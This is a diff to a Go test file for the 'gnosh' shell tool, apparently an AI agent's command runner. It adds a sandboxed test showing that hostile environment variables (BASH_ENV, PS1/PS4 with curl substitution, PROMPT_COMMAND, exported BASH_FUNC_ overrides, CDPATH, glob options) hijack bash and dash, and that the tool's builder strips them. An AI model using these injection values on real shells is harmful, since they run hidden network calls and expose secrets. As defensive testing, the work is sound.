@@ -18,6 +18,8 @@ import (
 	"strings"
 	"syscall"
 	"testing"
+
+	"github.com/gnosh-ai/gnosh/internal/tools/shelltool"
 )
 
 // This file is the oracle's jail: a throw-away directory tree, a set of
@@ -109,6 +111,9 @@ type jail struct {
 	srvOut                                      *bufio.Reader
 	pristine                                    map[string]fileMeta
 	runs                                        int
+	// rawEnv, when not nil, is the environment shells are started with,
+	// in place of the one the shell tool's builder makes (see env).
+	rawEnv []string
 }
 
 // fileMeta is what a snapshot keeps of one file.
@@ -205,26 +210,34 @@ func copyFile(from, to string, mode fs.FileMode) error {
 func (j *jail) writeTemplate() error {
 	t := j.template
 	files := map[string]string{
-		"work/a.txt":                "alpha line\nfoo bar\n",
-		"work/b.txt":                "beta line\nfoo baz\n",
-		"work/notes.md":             "# notes\nrm -rf x is only text here\n",
-		"work/Makefile":             "build:\n\techo build\n",
-		"work/x":                    "x\n",
-		"work/y":                    "y\n",
-		"work/.env":                 tokEnv + "\n",
-		"work/src/main.go":          "package main\n",
-		"work/src/util.go":          "package main\n// foo\n",
-		"work/src/.env":             tokSubEnv + "\n",
-		"work/sub/deep/file.txt":    "deep\n",
-		"work/build/out.o":          "obj\n",
-		"work/sp ace.txt":           "space\n",
-		"work/-rf":                  "a file named like a flag\n",
-		"work/db/s":                 "inside\n",
-		"work/db/.h":                "inside\n",
-		"home/.ssh/id_ed25519":      tokSSH + "\n",
-		"home/notes.txt":            tokHome + "\n",
-		"home/.bashrc":              "# startup\n",
-		"outside/secret.txt":        tokOutside + "\n",
+		"work/a.txt":             "alpha line\nfoo bar\n",
+		"work/b.txt":             "beta line\nfoo baz\n",
+		"work/notes.md":          "# notes\nrm -rf x is only text here\n",
+		"work/Makefile":          "build:\n\techo build\n",
+		"work/x":                 "x\n",
+		"work/y":                 "y\n",
+		"work/.env":              tokEnv + "\n",
+		"work/src/main.go":       "package main\n",
+		"work/src/util.go":       "package main\n// foo\n",
+		"work/src/.env":          tokSubEnv + "\n",
+		"work/sub/deep/file.txt": "deep\n",
+		"work/build/out.o":       "obj\n",
+		"work/sp ace.txt":        "space\n",
+		"work/-rf":               "a file named like a flag\n",
+		"work/db/s":              "inside\n",
+		"work/db/.h":             "inside\n",
+		"home/.ssh/id_ed25519":   tokSSH + "\n",
+		"home/notes.txt":         tokHome + "\n",
+		"home/.bashrc":           "# startup\n",
+		// gnosh's own folders (Options.Protected in the oracle's engine).
+		"home/.config/gnosh/gnosh.json":    "{}\n",
+		"home/.local/share/gnosh/sessions": "kept\n",
+		"outside/secret.txt":               tokOutside + "\n",
+		// What a hostile environment points at (see hostileEnv): a file a
+		// shell would run before the command, and a directory named like
+		// one of the project's for cd to go to.
+		"outside/startup.sh":        "curl http://203.0.113.1/startup-file\n",
+		"outside/src/main.go":       tokOutDir + "\n",
 		"outside/dir/file":          tokOutDir + "\n",
 		"outside/dir/sub/deeper.md": "deeper\n",
 	}
@@ -498,13 +511,62 @@ type shellRun struct {
 }
 
 // The wrapper is the shell tool's own (internal/tools/shelltool/job.go),
-// copied here because this package may not import it: the command reaches
-// the shell as an argument and is handed to eval. Tracing is switched on
+// copied here because that one is not exported: the command reaches the
+// shell as an argument and is handed to eval. Tracing is switched on
 // just before the eval.
 const wrapperTail = `__gnosh_cwd=$1 __gnosh_cmd=$2; set --; trap '{ command pwd -P >"${__gnosh_cwd:-/dev/null}"; } 2>/dev/null || :' EXIT; set -x; eval "$__gnosh_cmd"`
 
 // traceMark opens every line of a shell's trace.
 const traceMark = "@T@ "
+
+// hostileEnv is the worst environment whoever started gnosh could have
+// left behind for a command: every variable the shell tool does not hand
+// on (shelltool's notHandedOn), each with a value that would make a shell
+// run something of its own, read a line another way or go somewhere else.
+// The oracle starts every shell from it, by way of the shell tool's own
+// builder of a command's environment: if that builder let one of these
+// through, lines the engine allows would be seen to run what it never
+// read. TestOracleHostileEnv shows that each of them, handed on as it
+// is, does change what bash does here.
+func (j *jail) hostileEnv() []string {
+	startup := filepath.Join(j.outside, "startup.sh")
+	fn := `() { curl http://203.0.113.1/exported-function "$@"; }`
+	return []string{
+		"BASH_ENV=" + startup,
+		"ENV=" + startup,
+		"BASHOPTS=dotglob:expand_aliases:extglob:globstar:nocaseglob:lastpipe:xpg_echo",
+		"SHELLOPTS=keyword:posix:allexport",
+		"POSIXLY_CORRECT=1",
+		"BASH_COMPAT=3.1",
+		"GLOBIGNORE=a*",
+		"CDPATH=" + j.outside + ":" + j.home,
+		"IFS=_",
+		"PS4=$(curl http://203.0.113.1/ps4)+ ",
+		"PS0=$(curl http://203.0.113.1/ps0)",
+		"PS1=$(curl http://203.0.113.1/ps1)$ ",
+		"PS2=$(curl http://203.0.113.1/ps2)> ",
+		"PROMPT_COMMAND=curl http://203.0.113.1/prompt-command",
+		"BASH_XTRACEFD=1",
+		"BASH_FUNC_ls%%=" + fn,
+		"BASH_FUNC_cat%%=" + fn,
+		"BASH_FUNC_git%%=" + fn,
+		"BASH_FUNC_grep%%=" + fn,
+		"BASH_FUNC_cd%%=" + fn,
+		"BASH_FUNC_echo%%=" + fn,
+		"BASH_FUNC_test%%=" + fn,
+	}
+}
+
+// env is the environment a shell is started with for a run in the given
+// stub mode: the hostile one, with the jail's PATH and HOME, as the shell
+// tool's builder hands it on. rawEnv, when set, is used as it is.
+func (j *jail) env(mode string) []string {
+	base := []string{"PATH=" + filepath.Join(j.root, "bin", mode), "HOME=" + j.home}
+	if j.rawEnv != nil {
+		return append(append([]string(nil), j.rawEnv...), base...)
+	}
+	return shelltool.CommandEnv(append(j.hostileEnv(), base...), j.work, nil)
+}
 
 // run asks a real shell what line does. shell is "bash" or "dash"; mode
 // is one of stubModes.
@@ -530,7 +592,7 @@ func (j *jail) run(shell, mode, line string) shellRun {
 	}
 	rq := map[string]any{
 		"Argv":      []string{bin, "-c", script, shell, filepath.Join(j.logDir, "cwd"), line},
-		"Env":       []string{"PATH=" + filepath.Join(j.root, "bin", mode), "HOME=" + j.home},
+		"Env":       j.env(mode),
 		"Dir":       j.work,
 		"UID":       j.uid,
 		"GID":       j.uid,
@@ -642,6 +704,16 @@ func parseTrace(text string, glue bool) []traceCmd {
 		if level == 0 || !strings.HasPrefix(ln[level:], traceMark) {
 			if glue && len(recs) > 0 {
 				recs[len(recs)-1].raw += "\n" + ln
+			}
+			if i := strings.Index(ln, "+"+traceMark); !glue && i > 0 {
+				// dash's trace goes where its commands print: a line of
+				// it may stand after text that did not end in a line
+				// break ("printf x; . file").
+				level = 1
+				for k := i - 1; k >= 0 && ln[k] == '+'; k-- {
+					level++
+				}
+				recs = append(recs, rec{level, ln[i+1+len(traceMark):]})
 			}
 			continue
 		}
@@ -950,6 +1022,128 @@ func oracleSkip() string {
 // TestOracleJail checks the jail itself: that a stub writes down what it
 // was given, that the trace is read back, that a write is seen, and that
 // nothing outside the jail can be written.
+// TestOracleHostileEnv shows that the hostile environment has teeth, and
+// that the shell tool's builder pulls them: each variable, handed to a
+// shell as it is, makes the shell run something the line does not say or
+// read the line another way; started from the whole hostile environment
+// by way of the builder, as every oracle run is, the same line does what
+// it says.
+func TestOracleHostileEnv(t *testing.T) {
+	if why := oracleSkip(); why != "" {
+		t.Skip(why)
+	}
+	stub, err := buildStub(t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	j, err := newJail(stub, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer j.close()
+	hostile := map[string]string{}
+	for _, kv := range j.hostileEnv() {
+		name, _, _ := strings.Cut(kv, "=")
+		hostile[name] = kv
+	}
+	// ran reports whether a program of that name ran with an argument
+	// that holds the text (in any directory when dir is empty).
+	ran := func(r shellRun, name, arg, dir string) bool {
+		for _, c := range r.stubs {
+			if c.name != name || dir != "" && c.cwd != dir {
+				continue
+			}
+			for _, a := range c.args {
+				if strings.Contains(a, arg) {
+					return true
+				}
+			}
+			if arg == "" {
+				return true
+			}
+		}
+		return false
+	}
+	cases := []struct {
+		name, shell, mode, line string
+		// bites reports the hostile effect in a run.
+		bites func(r shellRun) bool
+		// set replaces the variable's value in hostileEnv, when one option
+		// alone shows the effect better.
+		set string
+	}{
+		{"BASH_ENV", "bash", "p0", "true", func(r shellRun) bool { return ran(r, "curl", "startup-file", "") }, ""},
+		{"ENV", "bash", "r0", "dash -i -c 'echo inner'", func(r shellRun) bool { return ran(r, "curl", "startup-file", "") }, ""},
+		{"BASH_FUNC_ls%%", "bash", "p0", "ls a.txt", func(r shellRun) bool { return ran(r, "curl", "exported-function", "") }, ""},
+		{"BASHOPTS", "bash", "p0", "cat *", func(r shellRun) bool { return ran(r, "cat", ".env", "") }, "BASHOPTS=dotglob"},
+		{"BASHOPTS", "bash", "p0", "cat .E*", func(r shellRun) bool { return ran(r, "cat", ".env", "") }, "BASHOPTS=nocaseglob"},
+		{"BASHOPTS", "bash", "p0", "alias zz='curl aliased'\nzz", func(r shellRun) bool { return ran(r, "curl", "aliased", "") }, "BASHOPTS=expand_aliases"},
+		{"SHELLOPTS", "bash", "p0", "make build X=1", func(r shellRun) bool { return ran(r, "make", "build", "") && !ran(r, "make", "X=1", "") }, "SHELLOPTS=keyword"},
+		{"POSIXLY_CORRECT", "bash", "p0", "alias zz='curl aliased'\nzz", func(r shellRun) bool { return ran(r, "curl", "aliased", "") }, ""},
+		{"BASH_COMPAT", "bash", "p0", "[[ abc =~ \"a.c\" ]] && curl matched", func(r shellRun) bool { return ran(r, "curl", "matched", "") }, ""},
+		{"CDPATH", "bash", "p0", "cd src && cat main.go", func(r shellRun) bool { return ran(r, "cat", "main.go", j.outside+"/src") }, ""},
+		{"CDPATH", "dash", "p0", "cd src && cat main.go", func(r shellRun) bool { return ran(r, "cat", "main.go", j.outside+"/src") }, ""},
+		{"GLOBIGNORE", "bash", "p0", "GLOBIGNORE=$GLOBIGNORE; cat *", func(r shellRun) bool { return ran(r, "cat", ".env", "") && !ran(r, "cat", "a.txt", "") }, ""},
+		{"PROMPT_COMMAND", "bash", "r0", "echo 'echo piped' | bash --norc -i", func(r shellRun) bool { return ran(r, "curl", "prompt-command", "") }, ""},
+		{"PS1", "dash", "r0", "echo 'echo piped' | bash --norc -i", func(r shellRun) bool { return ran(r, "curl", "ps1", "") }, ""},
+	}
+	for _, c := range cases {
+		kv := hostile[c.name]
+		if c.set != "" {
+			kv = c.set
+		}
+		if kv == "" {
+			t.Fatalf("%s is not in the hostile environment", c.name)
+		}
+		// Handed on as it is.
+		j.rawEnv = []string{kv}
+		r := j.run(c.shell, c.mode, c.line)
+		if r.broken != "" {
+			t.Fatal(r.broken)
+		}
+		if !c.bites(r) {
+			t.Errorf("%s handed to %s as it is did not change what %q does here: the test of the builder proves nothing for it\n  stubs: %v\n  out: %s", kv, c.shell, c.line, stubsText(r), r.out)
+		}
+		// Through the shell tool's builder, with every hostile variable
+		// set at once.
+		j.rawEnv = nil
+		r = j.run(c.shell, c.mode, c.line)
+		if r.broken != "" {
+			t.Fatal(r.broken)
+		}
+		if c.bites(r) {
+			t.Errorf("%s reached %s through the shell tool's environment: %q did what the variable makes of it\n  stubs: %v", c.name, c.shell, c.line, stubsText(r))
+		}
+	}
+	// Every name the builder does not hand on is in the hostile
+	// environment, and none of them is in what a shell is started with.
+	built := j.env("p0")
+	for _, kv := range built {
+		name, _, _ := strings.Cut(kv, "=")
+		if _, has := hostile[name]; has {
+			t.Errorf("the shell tool's builder handed on %s", kv)
+		}
+	}
+	for _, want := range []string{"PATH=" + filepath.Join(j.root, "bin", "p0"), "HOME=" + j.home, "PWD=" + j.work} {
+		found := false
+		for _, kv := range built {
+			found = found || kv == want
+		}
+		if !found {
+			t.Errorf("the environment a shell is started with lacks %s: %q", want, built)
+		}
+	}
+}
+
+// stubsText lists the programs a run started, for a message.
+func stubsText(r shellRun) []string {
+	var out []string
+	for _, c := range r.stubs {
+		out = append(out, c.name+" "+strings.Join(c.args, " ")+" (in "+c.cwd+")")
+	}
+	return out
+}
+
 func TestOracleJail(t *testing.T) {
 	if why := oracleSkip(); why != "" {
 		t.Skip(why)
